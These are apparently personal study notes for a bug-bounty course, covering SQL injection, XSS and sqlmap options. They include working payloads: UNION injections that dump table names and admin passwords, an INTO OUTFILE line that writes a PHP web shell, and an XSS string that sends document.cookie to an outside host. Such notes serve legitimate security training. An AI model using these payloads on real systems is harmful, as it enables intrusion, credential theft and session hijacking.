# CBBH
Stuff for CBBH


  JavaScript Deobsfucation - Tools
    
    https://beautifier.io/
    http://www.jsnice.org/


  Intro to MySQL

    Connect to database
    sudo service mysql start
    
    mysql -h 94.237.62.195 -P 39097 -u root --password
    -h : for host/target
    -P : for custom port
    -u : for user
    --password : for password
  
    Find stuff with queries
    
    select * from employees where first_name LIKE 'Bar%' AND hire_date='1990-01-01';
    LIKE : You may use when searching for a substring in string (i.e Bar = Barton).
    % : Starts with (used in mysql)

    ')+or+id=4--+-

    Database enumeration

    #Get it without line breaking
    '+union+select+1,group_concat(table_name),3,4+from+information_schema.tables--+-

    #Get it nicier
    '+union+select+1,table_schema,table_name,4,5+from+information_schema.tables--+-
    
    #Writing files
    '+union+select+null,null,null,"<?php+system($_REQUEST['cmd']);?>"+into+outfile+"/var/www/html/blah2.php"--+-

    #Get data from whithin another database
    '+union+select+1,username,password,4,5+from+backup.admin_bk--+-

  Cross-Site Scripting

    #When creating a phishing form the submit button has to be just like so
    <input type="submit" name="submit" value="login">

    #That's a way to remove unanted html stuff from the page [gotta wrap it between script tags]
    document.getElementById("id-here").remove();


    #To stealk cookies
    "><img src=x onerror=this.src="http://ip/?c"+document.cookie;>

  SQLmap
    
    ##TIP: IF YOU CAN FIND BOUNDARIES, TRY TO COUNT THE NUMBER OF COLUMNS AND SPECIFY IT IN SQLMAP
    
    #Techniques and their meaning
    B: Boolean-based blind
    E: Error-based
    U: Union query-based
    S: Stacked queries
    T: Time-based blind
    Q: Inline queries

    #To parse erros and see the response
    --parse-errors

    #Level/Risk
    Risk: Might cause database entry loss or DoS (Denial of Service) [1-3]
    Level: Extends vectors and boundaries (i.e the lower the expectancy, the higher the level) [1-5]

    #To display the payloads
    -v 3 [verbose level 3]

    #To provide a certain number of cols
    --union-cols=1337

    #Boundaries
    Once you've found a specific prefix, do not forget to add the apostrophe ' to it
    --prefix="<change-here>"
    --suffix="<change-here>"

    #Search function
    --search 
    -C: column
    -T: table
    -D: database

    #Handling csrf token
    ##NOTE: THE PROPER WAY TO HANDLE THIS KINDA TOKEN IS BY, PASSING THEM WHEREVER THEY APPEAR (e.g cookie/body) AND USE THE FLAG --csrf-token WITH THE NAME OF THE PARAM THAT HOLDS THE TOKEN
    
    
    
